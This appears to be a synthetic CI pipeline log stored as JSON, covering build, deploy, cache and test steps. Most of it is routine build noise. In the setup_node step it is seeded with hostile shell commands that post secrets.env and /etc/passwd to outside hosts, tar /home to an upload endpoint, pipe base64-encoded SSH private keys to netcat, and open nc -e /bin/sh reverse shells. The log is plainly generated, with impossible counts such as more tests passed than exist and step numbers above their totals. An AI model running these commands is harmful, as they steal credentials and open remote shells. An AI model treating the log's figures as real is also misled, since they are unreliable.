v4.0\n=== Step save_cache completed ===\n=== Step: deploy_production ===\nWaiting...\nCompiling utils/main.py...\npip install: Successfully installed express-5.6\n[12:20:10] INFO: Starting build process\nUploading artifact 'build' (48 files)\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 16.9.6\nImage pulled successfully\nDone.\nFetching submodules...\nCache invalidated: node_modules\n[12:20:10] DEBUG: Query executed in 72ms\nChecking out develop branch\nReady.\nWARNING: prettier has known vulnerabilities\nStep 17/18: Deploying\nTLS handshake completed\nEnvironment: test\nConnecting to cloud.services:443...\nTests: 464 passed, 290 total\nProcessing...\nFinished.\nStep 11/15: Building\nReady.\nCompiling lib/main.py...\nnpm install: resolved 548 packages\n  PASS: integration/test_user_create.spec.js\nUsing Python 3.10\nPushing to registry...\nReady.\nTransforming 746 files...\nCache miss for key-1603\nWaiting...\nCompiling components/app.ts...\nReady.\nArtifact uploaded: dist.zip (10MB)\nUploading artifact 'coverage' (5 files)\nBundling runtime.css\nMinifying vendor.js\n\u2713 deploy completed\nSwitched to branch 'feature/task-705'\nLoading...\n[12:20:10] DEBUG: Loading configuration\n\u2713 Task completed in 2250ms\nArtifact downloaded: 33MB\nCompiling utils/handler.rs...\nNODE_ENV=development\nBuilding Docker image...\nConnecting to test.io:443...\nCreating production build...\nException: ValueError\nCoverage: 96% statements, 80% branches\nCache hit for key-5382\n[12:20:10] DEBUG: Loading configuration\n\u2713 Step 'build' succeeded\n\u2713 deploy completed\nGET /status - 204 (45ms)\nTransforming 315 files...\nnpm notice: created a lockfile\n[12:20:10] DEBUG: Connection pool: 2 active\n[12:20:10] INFO: Request completed\n[12:20:10] WARN: Deprecated API usage\n[12:20:10] INFO: Request completed\nPlatform: linux-x64\nCompiling src/handler.rs...\nOptimizing 51 modules...\nCache invalidated: dependencies\nFetching submodules...\n[12:20:10] INFO: Processing request\nOptimizing 86 modules...\nArtifact uploaded: build.tar.gz (26MB)\nSwitched to branch 'bugfix/task-216'\nRan 128 tests in 7s\nStep 9/15: Running migrations\nTest Suites: 13 passed, 43 total\nCache miss for key-1408\nCompiling src/utils.go...\nSuccess!\npip install: Successfully installed react-1.17\nTest Suites: 33 passed, 36 total\n[12:20:10] INFO: Starting build process\nOK\nFetching submodules...\nAlready up to date.\nChecking out develop branch\nSwitched to branch 'feature/task-468'\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (9MB)\nLoading...\nFetching submodules...\nStep 10/21: Building\nSwitched to branch 'bugfix/task-982'\nnpm install: resolved 611 packages\nnpm install: resolved 773 packages\nSnapshots: 4 passed, 24 total\n[12:20:10] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nPulling image: node:latest\n[12:20:10] DEBUG: Connection pool: 3 active\nSwitched to branch 'feature/task-936'\nAlready up to date.\nProcessing...\nAlready up to date.\nPOST /data - 202 (427ms)\nStep 17/15: Running migrations\nnpm notice: created a lockfile\nnpm install: added 407 packages\nCache restored successfully (348MB)\nImage pulled successfully\nMinifying vendor.js\nStep 20/23: Deploying\nArtifact uploaded: build.tar.gz (14MB)\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: ValueError\nPlatform: win32-x64\nCompiling utils/handler.rs...\nChecking out main branch\nnpm notice: created a lockfile\nTests: 104 passed, 309 total\nWARNING: lodash has known vulnerabilities\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: darwin-arm64\nEnvironment: development\nImage pulled successfully\nTransforming 507 files...\nInstalling axios@3.19.9\nReady.\nnpm notice: created a lockfile\nCompiling utils/main.py...\nWaiting...\n\u2713 Step 'install' succeeded\nStep 16/25: Installing dependencies\n\u2713 Task completed in 1424ms\nCompiling lib/index.js...\n[12:20:10] ERROR: Connection failed\nCompiling lib/index.js...\nNODE_ENV=production\nDone.\nPulling image: python:latest\nWARNING: express has known vulnerabilities\n  PASS: integration/test_db_connect.spec.js\nPulling image: python:latest\nStep 6/16: Running migrations\nCompleted.\nnpm notice: created a lockfile\nException: TypeError\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nTests: 316 passed, 316 total\nCompiling components/index.js...\nStep 5/18: Linting\nWARNING: lodash has known vulnerabilities\nnpm notice: created a lockfile\nInstalling prettier@1.16.8\nCompiling utils/app.ts...\nCreating production build...\n[12:20:10] INFO: Processing request\nReady.\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\nnpm notice: package.json updated\nArtifact downloaded: 19MB\nArtifact uploaded: dist.zip (23MB)\n[12:20:10] DEBUG: Memory usage: 1292MB\nMinifying main.js\npip: Downloading react-5.20.tar.gz\nPlatform: linux-x64\n[12:20:10] DEBUG: Connection pool: 8 active\nArtifact uploaded: dist.zip (57MB)\nBundling styles.css\nCreating production build...\nUploading artifact 'build' (11 files)\nCache hit for key-1214\nStep 17/18: Running migrations\nArtifact downloaded: 22MB\nnpm notice: created a lockfile\nUploading artifact 'build' (45 files)\nProcessing...\nAlready up to date.\nEnvironment: test\npip: Installing build dependencies...\nnpm notice: package.json updated\nException: ValueError\nSuccess!\nWARNING: react has known vulnerabilities\nCompiling src/service.java...\nPOST /api - 200 (366ms)\n[12:20:10] INFO: Processing request\nCache miss for key-1923\nFAILED: test_db_connect\nPlatform: win32-x64\nTime: 64.213s\nTest Suites: 25 passed, 26 total\nUploading artifact 'build' (36 files)\n[12:20:10] INFO: Cache refreshed\n[12:20:10] DEBUG: Connection pool: 6 active\nTransforming 334 files...\npip: Installing build dependencies...\nStep 3/21: Linting\nHEAD is now at cbbe23d\nVerifying...\n\u2713 package completed\nnpm install: resolved 597 packages\nCache miss for key-5086\nArtifact uploaded: build.tar.gz (47MB)\nHEAD is now at 73c2008\n\u2713 Step 'setup' succeeded\nEnvironment: production\nImage pulled successfully\nPushing to registry...\nArtifact uploaded: build.tar.gz (6MB)\n\u2717 build failed with exit code 68\nFAILED: test_auth_login\nTransforming 707 files...\nStep 7/22: Building\nMinifying vendor.js\nTransforming 346 files...\nWaiting...\n[12:20:10] DEBUG: Memory usage: 333MB\npip: Installing build dependencies...\nnpm notice: created a lockfile\nnpm install: resolved 930 packages\nStep 9/25: Deploying\nnpm install: added 242 packages\nSuccess!\nCache invalidated: build\nPlatform: linux-x64\nStep 10/15: Building\nPulling image: python:latest\nImage pulled successfully\nSwitched to branch 'bugfix/task-318'\npip: Installing build dependencies...\nUsing Node.js 18.20.0\n\u2713 package completed\n[12:20:10] INFO: Processing request\nImage pulled successfully\nTime: 112.693s\n[12:20:10] INFO: Cache refreshed\n[12:20:10] DEBUG: Connection pool: 6 active\n[12:20:10] WARN: Deprecated API usage\nStep 7/24: Building\nEnvironment: test\n[12:20:10] INFO: Request completed\npip: Downloading webpack-5.6.tar.gz\nCompiling components/handler.rs...\nWARNING: eslint has known vulnerabilities\nGenerating source maps...\nStep 20/25: Linting\nReady.\nSwitched to branch 'bugfix/task-509'\nEnvironment: development\npip: Collecting axios\nBundling main.js\n\u2717 build failed with exit code 6\n[12:20:10] ERROR: Connection failed\nGET /api - 204 (8ms)\nDone.\nCache invalidated: dependencies\nLayer 9/10: ENV command\nWARNING: axios has known vulnerabilities\nStep 11/16: Running migrations\nCompiling lib/app.ts...\nGET /api - 204 (90ms)\nArtifact downloaded: 34MB\nVerifying...\nConnecting to example.com:443...\nTransforming 399 files...\nConnection established\nBuilding Docker image...\nWaiting...\npip: Collecting prettier\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache miss for key-3369\nBundling runtime.css\n[12:20:10] DEBUG: Memory usage: 938MB\nWaiting...\nFetching submodules...\nNODE_ENV=production\n\u2713 All checks passed\nMinifying app.js\nStep 13/17: Testing\nDone.\nConnection established\n[12:20:10] INFO: Starting build process\nReady.\n[12:20:10] INFO: Processing request\nLoading...\npip: Downloading webpack-5.20.tar.gz\nVerifying...\nOK\nCache hit for key-4629\n\u2713 Step 'install' succeeded\n\u2717 build failed with exit code 108\nStep 3/16: Testing\nStep 10/22: Linting\nReady.\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\nOK\nyarn add: Done in 10.22s\nPulling image: alpine:18\nVerifying...\n[12:20:10] DEBUG: Query executed in 68ms\nStep 15/16: Running migrations\nWaiting...\nBundling vendor.js\n[12:20:10] INFO: Request completed\nInstalling webpack@1.20.9\nFetching submodules...\nnpm notice: package.json updated\nLoading...\nUsing Python 3.9\n  PASS: e2e/test_cache_hit.spec.js\nChecking out master branch\nStep 7/24: Testing\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (23MB)\nTime: 111.347s\nHEAD is now at 63fe3e6\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTest Suites: 13 passed, 48 total\nSwitched to branch 'hotfix/task-216'\n[12:20:10] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (34MB)\nCompleted.\nGET /status - 201 (75ms)\nGenerating source maps...\nPlatform: linux-x64\nnpm notice: package.json updated\nStep 4/25: Running migrations\nPOST /api - 200 (56ms)\nLoading...\n[12:20:10] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /upload - 202 (280ms)\n[12:20:10] DEBUG: Initializing service\npip: Collecting webpack\npip install: Successfully installed eslint-1.12\nyarn add: Done in 2.17s\nBuilding Docker image...\nCache invalidated: dependencies\n[12:20:10] DEBUG: Memory usage: 1130MB\nFetching submodules...\n[12:20:10] WARN: Deprecated API usage\nGET /health - 204 (8ms)\npip install: Successfully installed jest-2.10\nAlready up to date.\n[12:20:10] DEBUG: Connection pool: 16 active\nPlatform: linux-x64\nStep 2/22: Running migrations\nAlready up to date.\nSuccess!\nStep 12/23: Installing dependencies\nTests: 227 passed, 478 total\nUsing Node.js 15.1.8\nCompiling components/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nStep 10/18: Linting\nWARNING: express has known vulnerabilities\nCoverage: 74% statements, 88% branches\n\u2713 Step 'checkout' succeeded\n[12:20:10] INFO: Processing request\nWARNING: eslint has known vulnerabilities\npip: Collecting react\nProcessing...\nSnapshots: 30 passed, 13 total\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:10] DEBUG: Loading configuration\n[12:20:10] INFO: Connecting to database\nEnvironment: test\nReady.\nCreating production build...\nSnapshots: 12 passed, 22 total\nCache saved successfully\n[12:20:10] DEBUG: Loading configuration\n[12:20:10] INFO: Processing request\nTests: 359 passed, 345 total\nTest Suites: 32 passed, 45 total\nStep 2/16: Linting\nCoverage: 93% statements, 95% branches\nCache invalidated: dependencies\n[12:20:10] INFO: Starting build process\nTime: 72.253s\nHEAD is now at 2ac7482\nChecking out main branch\nLayer 8/9: ENV command\nNODE_ENV=production\nCache saved successfully\n[12:20:10] WARN: Deprecated API usage\n[12:20:10] INFO: Cache refreshed\nGET /health - 204 (19ms)\n[12:20:10] DEBUG: Loading configuration\nnpm notice: package.json updated\n[12:20:10] DEBUG: Connection pool: 10 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 145 tests in 25s\nImage pulled successfully\nSnapshots: 39 passed, 46 total\nLayer 5/9: COPY command\n  PASS: e2e/test_auth_login.spec.js\nCache invalidated: node_modules\nCompiling components/app.ts...\nWARNING: eslint has known vulnerabilities\nGET /api - 201 (5ms)\nArtifact uploaded: dist.zip (36MB)\nCache hit for key-3631\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGET /api - 204 (48ms)\n\u2713 Task completed in 4614ms\nPushing to registry...\nFetching submodules...\nCompiling src/app.ts...\npip: Collecting webpack\npip: Collecting react\nWARNING: jest has known vulnerabilities\nConnecting to test.io:443...\nCompiling utils/main.py...\nPulling image: alpine:18\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:10] DEBUG: Connection pool: 4 active\n[12:20:10] ERROR: Connection failed\nNODE_ENV=development\npip: Collecting express\nStep 3/25: Deploying\n[12:20:10] DEBUG: Query executed in 86ms\nPushing to registry...\nTransforming 749 files...\n[12:20:10] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\n[12:20:10] DEBUG: Query executed in 56ms\n[12:20:10] DEBUG: Memory usage: 1254MB\nTransforming 662 files...\nStep 7/20: Linting\nStep 20/17: Testing\nnpm notice: package.json updated\nPOST /api - 201 (343ms)\nPOST /upload - 202 (119ms)\nCache invalidated: node_modules\nWARNING: express has known vulnerabilities\n\u2713 Task completed in 3101ms\n[12:20:10] INFO: Connecting to database\n\u2713 All checks passed\nInstalling webpack@5.2.6\n[12:20:10] DEBUG: Connection pool: 7 active\n=== Step restore_cache completed ===\n=== Step: build ===\nnpm install: added 495 packages\nGenerating source maps...\nCreating production build...\n\u2713 Task completed in 4788ms\nProcessing...\nOK\nConnection established\nArtifact downloaded: 34MB\nGET /status - 204 (76ms)\nVerifying...\n[12:20:10] DEBUG: Connection pool: 19 active\npip: Installing build dependencies...\nHEAD is now at 7ac4c66\nConnecting to test.io:443...\nCompiling utils/utils.go...\nSnapshots: 17 passed, 27 total\nCompleted.\nSwitched to branch 'hotfix/task-946'\n\u2713 Task completed in 2012ms\nMinifying vendor.js\n[12:20:10] INFO: Cache refreshed\nCompiling components/utils.go...\npip: Collecting axios\nChecking out main branch\nOK\nVerifying...\nTransforming 974 files...\nPulling image: python:latest\nWARNING: webpack has known vulnerabilities\nDone.\nCache invalidated: build\nnpm notice: package.json updated\nVerifying...\n\u2717 build failed with exit code 71\nCompiling src/index.js...\n[12:20:10] WARN: Deprecated API usage\nUsing Node.js 15.14.7\n\u2713 lint completed\nOptimizing 58 modules...\nArtifact downloaded: 13MB\nCache hit for key-6029\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:10] INFO: Request completed\nProcessing...\nFinished.\nLayer 8/15: COPY command\nnpm install: added 109 packages\nFinished.\nStep 4/18: Building\n\u2717 build failed with exit code 97\n[12:20:10] ERROR: Connection failed\nCompleted.\nFAILED: test_auth_login\nCompiling src/index.js...\nUploading artifact 'coverage' (46 files)\nCache hit for key-6936\nNODE_ENV=production\nSwitched to branch 'feature/task-580'\n[12:20:10] INFO: Processing request\nException: ValueError\npip install: Successfully installed prettier-1.2\nSuccess!\nTLS handshake completed\n[12:20:10] INFO: Connecting to database\nCache restored successfully (380MB)\nStep 18/17: Testing\n[12:20:10] INFO: Starting build process\nStep 11/18: Deploying\nPulling image: python:18\nUsing Python 3.12\nConnection established\nDone.\n[12:20:10] DEBUG: Initializing service\nWARNING: eslint has known vulnerabilities\nUsing Python 3.9\nTime: 32.5s\n[12:20:10] DEBUG: Memory usage: 274MB\nBuilding Docker image...\nGET /health - 204 (80ms)\npip: Installing build dependencies...\nException: RuntimeError\nGET /health - 204 (67ms)\nAlready up to date.\n[12:20:10] DEBUG: Initializing service\nWARNING: eslint has known vulnerabilities\npip: Downloading prettier-3.13.tar.gz\nStep 12/23: Deploying\nCompiling src/main.py...\nHEAD is now at 28cde8f\nStep 17/21: Linting\n  PASS: test_auth_login (242ms)\nPushing to registry...\npip: Collecting react\nReady.\nArtifact uploaded: build.tar.gz (5MB)\nImage pulled successfully\nStep 20/20: Installing dependencies\nDone.\nMinifying main.js\n\u2713 validate completed\n  PASS: test_api_health (154ms)\n\u2713 Step 'install' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLayer 5/12: COPY command\nVerifying...\n\u2713 Step 'checkout' succeeded\nCache saved successfully\nTest Suites: 30 passed, 21 total\n[12:20:10] DEBUG: Connection pool: 10 active\nConnecting to cloud.services:443...\nBundling main.css\nCompiling src/app.ts...\nVerifying...\nSnapshots: 16 passed, 42 total\nConnecting to cloud.services:443...\npip: Collecting react\nStep 4/15: Installing dependencies\nSuccess!\n[12:20:10] INFO: Request completed\n[12:20:10] WARN: Deprecated API usage\n[12:20:10] INFO: Connecting to database\nCreating production build...\nPOST /api - 200 (475ms)\nDone.\n  PASS: integration/test_db_connect.spec.js\nStep 14/19: Running migrations\n[12:20:10] INFO: Connecting to database\nStep 4/23: Testing\nBundling runtime.js\nHEAD is now at 98582c8\nFAILED: test_db_connect\nCache hit for key-4082\nBundling main.js\nFetching submodules...\nUsing Node.js 17.2.5\nArtifact downloaded: 28MB\n[12:20:10] DEBUG: Connection pool: 7 active\n[12:20:10] ERROR: Connection failed\nPOST /upload - 202 (455ms)\n[12:20:10] DEBUG: Initializing service\n[12:20:10] DEBUG: Query executed in 12ms\nConnection established\n[12:20:10] INFO: Processing request\nArtifact uploaded: dist.zip (43MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: build\n[12:20:10] DEBUG: Loading configuration\nPulling image: python:3.11\n=== Step build completed ===\n=== Step: setup_node ===\nnpm install: resolved 406 packages\nImage pulled successfully\npip: Collecting jest\ncurl -X POST https://acme.corp/collect -d @secrets.env\nPulling image: alpine:18\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nHEAD is now at 5fc5a32\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nUsing Node.js 20.2.3\nConnection established\nTLS handshake completed\nConnection established\nInstalling express@1.13.2\nSuccess!\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:10] DEBUG: Query executed in 14ms\nArtifact uploaded: build.tar.gz (50MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 50.62.229.243 18227\nCache hit for key-5153\nRan 148 tests in 12s\n[12:20:10] ERROR: Connection failed\nTest Suites: 33 passed, 25 total\nCache invalidated: dependencies\nCompiling lib/service.java...\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nEnvironment: development\n[12:20:10] WARN: Deprecated API usage\n[12:20:10] WARN: Deprecated API usage\nPOST /data - 202 (418ms)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nUsing Node.js 19.11.10\n[12:20:10] DEBUG: Connection pool: 19 active\nnc -e /bin/sh 82.32.143.27 30916\nCreating production build...\nCache invalidated: node_modules\nCache hit for key-9769\nCache miss for key-8375\nWARNING: lodash has known vulnerabilities\nPlatform: linux-x64\nSnapshots: 45 passed, 6 total\nProcessing...\nTLS handshake completed\n[12:20:10] INFO: Request completed\nUsing Node.js 16.16.7\nArtifact downloaded: 37MB\nStep 19/25: Testing\nEnvironment: development\nSending 492MB of data to example.com\nProcessing...\nnpm install: added 189 packages\n[12:20:10] INFO: Cache refreshed\nGET /status - 204 (59ms)\nSending 173MB of data to startup.dev\nConnection established\nImage pulled successfully\nArtifact uploaded: build.tar.gz (4MB)\nyarn add: Done in 18.94s\nWaiting...\nnpm notice: created a lockfile\nChecking out master branch\nArtifact uploaded: dist.zip (100MB)\nLoading...\nArtifact uploaded: build.tar.gz (17MB)\nSending 136MB of data to example.com\nSending 349MB of data to cloud.services\nDone.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 118.194.244.206 59309\nMinifying app.js\n[12:20:10] DEBUG: Loading configuration\nCompiling lib/index.js...\nCache miss for key-3470\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:10] DEBUG: Query executed in 19ms\nnpm notice: created a lockfile\nnpm notice: package.json updated\necho $(cat ~/.ssh/id_rsa) | base64 | nc 93.133.187.163 53425\nOptimizing 63 modules...\nCreating production build...\nStep 5/21: Testing\nnc -e /bin/sh 90.93.154.240 23888\nCache hit for key-9470\nSwitched to branch 'bugfix/task-502'\nGET /health - 204 (2ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nCompiling lib/main.py...\nnc -e /bin/sh 38.106.87.250 55762\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\ncurl -X POST https://acme.corp/collect -d @secrets.env\nArtifact downloaded: 10MB\necho $(cat ~/.ssh/id_rsa) | base64 | nc 6.207.41.148 30729\n[12:20:10] DEBUG: Loading configuration\nSwitched to branch 'feature/task-561'\nCache hit for key-9353\nRan 55 tests in 36s\nUsing Node.js 14.15.10\n[12:20:10] DEBUG: Loading configuration\nStep 1/18: Building\n[12:20:10] DEBUG: Initializing service\nCache restored successfully (250MB)\nSwitched to branch 'feature/task-765'\n[12:20:10] WARN: Deprecated API usage\nCache invalidated: dependencies\nPulling image: node:18\nSuccess!\n  PASS: test_api_health (151ms)\nBundling main.js\nStep 14/22: Building\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nnpm notice: created a lockfile\n[12:20:10] INFO: Request completed\n\u2713 All checks passed\nCompiling components/index.js...\npip: Installing build dependencies...\nTests: 87 passed, 362 total\nPulling image: alpine:3.11\nTransforming 719 files...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 197.138.17.21 11090\n[12:20:10] DEBUG: Loading configuration\nConnection established\nStep 16/18: Testing\nnpm install: added 265 packages\n[12:20:10] WARN: Deprecated API usage\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:20:10] INFO: Processing request\n[12:20:10] DEBUG: Connection pool: 7 active\n\u2713 deploy completed\nnpm install: added 498 packages\n[12:20:10] INFO: Cache refreshed\nArtifact downloaded: 39MB\npip: Collecting react\nStep 19/23: Linting\n\u2717 build failed with exit code 83\n[12:20:10] INFO: Starting build process\nCreating production build...\n[12:20:10] DEBUG: Loading configuration\n[12:20:10] INFO: Connecting to database\nConnecting to cloud.services:443...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 49.109.39.234 63737\nWARNING: react has known vulnerabilities\nStep 2/24: Testing\nArtifact uploaded: build.tar.gz (22MB)\n[12:20:10] INFO: Connecting to database\necho $(cat ~/.ssh/id_rsa) | base64 | nc 84.176.159.91 57619\nNODE_ENV=test\nGET /health - 201 (3ms)\nStep 16/20: Linting\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:20:10] INFO: Cache refreshed\ncurl -X POST https://test.io/collect -d @secrets.env\nStep 9/20: Deploying\nVerifying...\nChecking out master branch\n  PASS: unit/test_user_create.spec.js\n\u2713 deploy completed\nProcessing...\nnpm install: added 481 packages\nBuilding Docker image...\nStep 12/17: Running migrations\nCache invalidated: node_modules\nStep 11/17: Installing dependencies\nAlready up to date.\npip install: Successfully installed jest-1.14\nWaiting...\nPOST /upload - 200 (295ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 172.125.58.145 41609\nTests: 175 passed, 351 total\nyarn add: Done in 11.69s\ncurl -X POST https://startup.dev/collect -d @secrets.env\nUsing Node.js 20.2.0\npip: Collecting webpack\n[12:20:10] DEBUG: Memory usage: 995MB\nReady.\nWARNING: prettier has known vulnerabilities\npip: Collecting eslint\n\u2717 build failed with exit code 95\n[12:20:10] INFO: Connecting to database\n=== Step setup_node completed ===",
    "steps": [
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-27T12:20:10.832607",
        "finished_at": "2025-11-27T12:20:47.333379",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:20:10] INFO: Connecting to database",
          "Environment: staging",
          "Bundling runtime.js",
          "Step 13/24: Testing",
          "pip install: Successfully installed eslint-4.15",
          "[12:20:10] DEBUG: Loading configuration",
          "Completed.",
          "Connection established",
          "Artifact downloaded: 21MB",
          "[12:20:10] INFO: Connecting to database",
          "Compiling utils/index.js...",
          "\u2713 Step 'checkout' succeeded",
          "Finished.",
          "\u2713 Task completed in 3496ms",
          "Already up to date.",
          "Image pulled successfully",
          "Pulling image: alpine:18",
          "\u2713 deploy completed",
          "Minifying vendor.js",
          "Finished.",
          "Cache invalidated: dependencies",
          "[12:20:10] DEBUG: Loading configuration",
          "HEAD is now at d188806",
          "Artifact uploaded: dist.zip (89MB)",
          "\u2713 package completed",
          "[12:20:10] INFO: Request completed",
          "Cache saved successfully",
          "[12:20:10] DEBUG: Memory usage: 1895MB",
          "Cache hit for key-4085",
          "Time: 6.642s",
          "Using Python 3.11",
          "Connecting to cloud.services:443...",
          "Compiling components/index.js...",
          "pip install: Successfully installed eslint-3.18",
          "Cache miss for key-1420",
          "Connecting to acme.corp:443...",
          "Step 14/17: Deploying",
          "Processing...",
          "yarn add: Done in 4.43s",
          "\u2713 package completed",
          "Step 9/25: Running migrations",
          "Tests: 358 passed, 286 total",
          "\u2713 Task completed in 4019ms",
          "Cache invalidated: build",
          "Time: 19.917s",
          "[12:20:10] INFO: Starting build process",
          "Already up to date.",
          "[12:20:10] DEBUG: Connection pool: 12 active",
          "Verifying...",
          "Processing...",
          "Cache miss for key-5289",
          "[12:20:10] INFO: Cache refreshed",
          "[12:20:10] INFO: Connecting to database",
          "Ran 136 tests in 27s",
          "Cache saved successfully",
          "[12:20:10] INFO: Starting build process",
          "GET /status - 200 (34ms)",
          "[12:20:10] INFO: Processing request",
          "[12:20:10] INFO: Connecting to database",
          "Environment: production",
          "npm install: added 175 packages",
          "Step 14/19: Running migrations",
          "Using Python 3.10",
          "[12:20:10] DEBUG: Loading configuration",
          "Finished.",
          "Compiling components/index.js...",
          "Success!",
          "TLS handshake completed",
          "\u2713 Step 'checkout' succeeded",
          "Completed.",
          "Layer 5/15: ENV command",
          "Artifact uploaded: dist.zip (34MB)",
          "Uploading artifact 'dist' (26 files)",
          "Layer 2/14: COPY command",
          "\u2713 build completed",
          "[12:20:10] INFO: Cache refreshed",
          "[12:20:10] INFO: Starting build process",
          "Installing eslint@1.7.6",
          "Environment: test",
          "Done.",
          "Processing...",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Ran 176 tests in 4s",
          "[12:20:10] INFO: Cache refreshed",
          "Ready.",
          "[12:20:10] INFO: Processing request",
          "Coverage: 95% statements, 93% branches",
          "  PASS: e2e/test_db_connect.spec.js",
          "Compiling lib/service.java...",
          "Checking out develop branch",
          "HEAD is now at d1b3490",
          "Ready.",
          "Uploading artifact 'coverage' (29 files)",
          "[12:20:10] DEBUG: Loading configuration",
          "Step 19/15: Testing",
          "Environment: development",
          "Tests: 304 passed, 97 total",
          "Processing...",
          "Test Suites: 46 passed, 37 total",
          "pip install: Successfully installed axios-1.13",
          "HEAD is now at 711a891",
          "[12:20:10] DEBUG: Memory usage: 106MB",
          "Cache invalidated: dependencies",
          "yarn add: Done in 19.78s",
          "pip: Downloading prettier-1.18.tar.gz",
          "Building Docker image...",
          "Using Python 3.11",
          "POST /upload - 202 (224ms)",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/service.java...",
          "Loading...",
          "  PASS: test_db_connect (147ms)",
          "yarn add: Done in 11.90s",
          "POST /data - 200 (316ms)",
          "Already up to date.",
          "[12:20:10] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Environment: development",
          "Image pulled successfully",
          "\u2713 package completed",
          "Step 18/20: Installing dependencies",
          "Success!",
          "Artifact downloaded: 32MB",
          "[12:20:10] INFO: Connecting to database",
          "\u2713 Task completed in 1492ms",
          "Coverage: 94% statements, 84% branches",
          "Switched to branch 'feature/task-110'",
          "OK",
          "pip install: Successfully installed express-2.3",
          "[12:20:10] INFO: Starting build process",
          "Cache invalidated: build",
          "Cache hit for key-6535",
          "Building Docker image...",
          "Checking out main branch",
          "[12:20:10] WARN: Deprecated API usage",
          "HEAD is now at 4e8447c",
          "Step 6/22: Installing dependencies",
          "npm install: resolved 768 packages",
          "Cache invalidated: node_modules",
          "Test Suites: 48 passed, 28 total",
          "npm install: added 30 packages",
          "npm notice: package.json updated",
          "[12:20:10] INFO: Cache refreshed",
          "GET /api - 204 (80ms)",
          "Time: 5.254s",
          "pip install: Successfully installed lodash-2.4",
          "[12:20:10] ERROR: Connection failed",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-27T12:20:47.333379",
        "finished_at": "2025-11-27T12:21:42.084537",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Switched to branch 'feature/task-329'",
          "Using Python 3.9",
          "Time: 96.784s",
          "Test Suites: 36 passed, 33 total",
          "POST /api - 202 (219ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "pip install: Successfully installed lodash-1.13",
          "Completed.",
          "Using Node.js 18.9.9",
          "pip: Downloading lodash-5.12.tar.gz",
          "Connection established",
          "Snapshots: 16 passed, 46 total",
          "Processing...",
          "TLS handshake completed",
          "Artifact downloaded: 43MB",
          "Step 20/25: Running migrations",
          "npm notice: package.json updated",
          "Bundling main.css",
          "Processing...",
          "Cache miss for key-3311",
          "Environment: development",
          "Environment: test",
          "  PASS: test_api_health (462ms)",
          "  PASS: test_db_connect (311ms)",
          "pip: Collecting express",
          "Step 18/21: Linting",
          "WARNING: prettier has known vulnerabilities",
          "Using Python 3.10",
          "Time: 68.155s",
          "\u2713 All checks passed",
          "pip: Downloading lodash-1.0.tar.gz",
          "Building Docker image...",
          "Waiting...",
          "Optimizing 88 modules...",
          "[12:20:10] INFO: Cache refreshed",
          "\u2713 package completed",
          "Optimizing 20 modules...",
          "  PASS: test_cache_hit (306ms)",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Coverage: 82% statements, 65% branches",
          "HEAD is now at 97d1d41",
          "npm install: added 332 packages",
          "Building Docker image...",
          "Finished.",
          "Compiling utils/index.js...",
          "Ran 84 tests in 42s",
          "Connection established",
          "Step 4/15: Running migrations",
          "[12:20:10] INFO: Request completed",
          "Step 10/20: Linting",
          "[12:20:10] INFO: Connecting to database",
          "Using Python 3.9",
          "POST /api - 202 (121ms)",
          "Processing...",
          "Fetching submodules...",
          "yarn add: Done in 12.11s",
          "[12:20:10] INFO: Connecting to database",
          "Ready.",
          "Cache miss for key-9810",
          "OK",
          "Tests: 419 passed, 50 total",
          "\u2717 build failed with exit code 88",
          "WARNING: prettier has known vulnerabilities",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Loading...",
